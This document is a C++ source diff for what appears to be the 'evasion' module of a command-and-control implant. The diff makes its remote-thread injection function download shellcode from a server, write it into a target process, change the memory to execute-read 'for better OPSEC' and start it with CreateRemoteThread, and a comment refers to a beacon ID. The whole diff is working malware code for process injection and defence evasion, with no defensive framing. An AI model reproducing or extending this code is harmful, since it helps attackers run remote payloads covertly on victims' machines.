@@ -1,8 +1,10 @@
 #include "evasion.h"
 #include "base64.h"
 #include "HttpCommunicator.h"
+#include "vector"
 #include <windows.h>
 #include <iostream>
+#include <TlHelp32.h>
 
 // TBD: This could lead to buffer overflows -> check if it is enough
 #define BUFSIZE 4096
@@ -10,22 +12,36 @@
 void evasion::inject_remote_thread(int pid) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
 
-    LPVOID addr = VirtualAllocExNuma(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
+
+    // HERE WE WILL GET THE SHELLCODE BYTES FROM SERVER
+    
+    std::vector<BYTE> bufVector = HttpCommunicator::download_shellcode();
+
+
+    LPVOID addr = VirtualAllocExNuma(hProcess, NULL, bufVector.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
 
     if (addr == NULL) {
         std::cout << "[!] Error: " << GetLastError() << std::endl;
         return;
     }
 
-    // HERE WE WILL GET THE SHELLCODE BYTES
-    BYTE buf[3] = { 0X90, 0X90, 0X90 };
-
-    SIZE_T* outSize = NULL;
-    if (WriteProcessMemory(hProcess, addr, buf, 3, outSize) == 0) {
+    
+    SIZE_T outSize;
+    if (!WriteProcessMemory(hProcess, addr, &bufVector[0], bufVector.size(), &outSize)) {
         std::cout << "[!] Error: " << GetLastError() << std::endl;
         return;
     }
 
+    // REVERT PERMISSIONS FOR BETTER OPSEC
+    DWORD oldPermissions = 0;
+
+    
+    if (!VirtualProtectEx(hProcess, addr, bufVector.size(), PAGE_EXECUTE_READ, &oldPermissions)) {
+        std::cout << "[!] Error: " << GetLastError() << std::endl;
+        return;
+    }
+    
+    DWORD threadId = 0;
     HANDLE hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -33,8 +49,12 @@ void evasion::inject_remote_thread(int pid) {
         (LPTHREAD_START_ROUTINE)addr,
         NULL, // here we will mention the beacon ID
         0,
-        NULL
+        &threadId
     );
+
+    if (hThread) {
+        std::cout << "[+] Injected Thread: " << threadId << std::endl;
+    }
 }
 
 
